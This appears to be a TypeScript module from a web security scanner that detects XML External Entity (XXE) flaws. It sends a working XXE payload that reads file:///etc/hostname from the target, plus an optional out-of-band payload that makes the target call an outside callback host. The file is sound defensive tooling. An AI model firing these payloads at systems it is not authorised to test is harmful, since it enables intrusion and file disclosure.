// XXE (XML External Entity) detector — OWASP A05:2021 Security
// Misconfiguration, CWE-611. Doc §6.5.
//
// `target` must be an endpoint that accepts XML (SOAP APIs, file uploads,
// SAML). Tries a local-file entity (reads a small, well-known file whose
// content is easy to recognize) and, if params.callback is given, an
// out-of-band entity pointing at that callback for blind confirmation.

import { JobContext, ModuleMeta, safeFetch, validateTargetUrl } from "./base";

export const meta: ModuleMeta = {
  id: "xxe_probe",
  name: "XXE (XML External Entity) Detector",
  description: "Sends external-entity XML payloads to an XML-accepting endpoint to confirm entity resolution.",
  riskTier: "active",
};

function localFilePayload(): string {
  return `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<foo>&xxe;</foo>`;
}

function oobPayload(callback: string): string {
  return `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${callback}/xxe_test">]>
<foo>&xxe;</foo>`;
}

export async function* run(
  targetRaw: string,
  params: Record<string, string>,
  ctx: JobContext
): AsyncGenerator<string> {
  const target = validateTargetUrl(targetRaw);
  const callback = (params.callback ?? "").trim();

  yield "=== XXE DETECTOR ===";
  yield `Target: ${target}`;
  yield "=====================";

  const findings: Array<Record<string, unknown>> = [];
  const headers = { "Content-Type": "application/xml" };

  yield "";
  yield "[*] Sending local-file entity payload (file:///etc/hostname)";
  const resp = await safeFetch(target, ctx, { method: "POST", headers, body: localFilePayload() });
  if (resp) {
    const body = await resp.text().catch(() => "");
    // A resolved /etc/hostname is typically a short single token line.
    if (/^[a-zA-Z0-9._-]{1,64}$/m.test(body.trim()) && body.trim().length > 0 && body.trim().length < 200) {
      yield `[VULN] Response body looks like a resolved file — possible XXE: ${JSON.stringify(body.slice(0, 100))}`;
      findings.push({ severity: "CRITICAL", check: "xxe_local_file", evidence: body.slice(0, 300) });
    } else {
      yield `[OK] No resolved-file signature in response (HTTP ${resp.status})`;
    }
  } else {
    yield "[ERR] Request failed — target may not accept XML at this endpoint";
  }

  if (callback) {
    yield "";
    yield `[*] Sending out-of-band entity payload (${callback})`;
    await safeFetch(target, ctx, { method: "POST", headers, body: oobPayload(callback) });
    yield "[OK] Request sent. Check your callback server for DNS/HTTP interactions.";
  }

  ctx.result.findings = findings;
  yield "";
  yield "=====================";
  yield findings.length > 0 ? `[VULN] ${findings.length} finding(s)` : "[OK] No XXE confirmed via local-file test";
}
